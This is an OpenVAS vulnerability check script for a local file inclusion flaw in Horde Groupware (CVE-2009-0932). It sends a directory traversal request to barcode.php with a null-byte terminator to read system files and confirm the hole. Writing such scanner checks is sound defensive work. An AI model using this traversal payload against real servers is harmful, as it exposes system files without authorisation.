###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_horde_lfi_vuln.nasl 13792 2019-02-20 13:15:35Z cfischer $
#
# Horde Products Local File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:horde:horde_groupware';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801849");
  script_version("$Revision: 13792 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-20 14:15:35 +0100 (Wed, 20 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
  script_cve_id("CVE-2009-0932");
  script_bugtraq_id(33491);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Horde Products Local File Inclusion Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/33695");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98424/horde-lfi.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("horde_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("horde/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to include and execute
  arbitrary local files via directory traversal sequences in the Horde_Image driver name.");

  script_tag(name:"affected", value:"Horde versions before 3.2.4 and 3.3.3, Horde Groupware versions before
  1.1.5");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input to the
  'driver' argument of the 'Horde_Image::factory' method before using it to include PHP code in
  'lib/Horde/Image.php'.");

  script_tag(name:"solution", value:"Upgrade to Horde 3.2.4 or 3.3.3 and Horde Groupware 1.1.5.");

  script_tag(name:"summary", value:"The host is running Horde and is prone to local file inclusion
  vulnerability.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern (keys(files)) {

  file = files[pattern];
  url = dir + "/util/barcode.php?type=../../../../../../../../../../../" + file + "%00";

  if (http_vuln_check(port:port, url:url, pattern:pattern, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);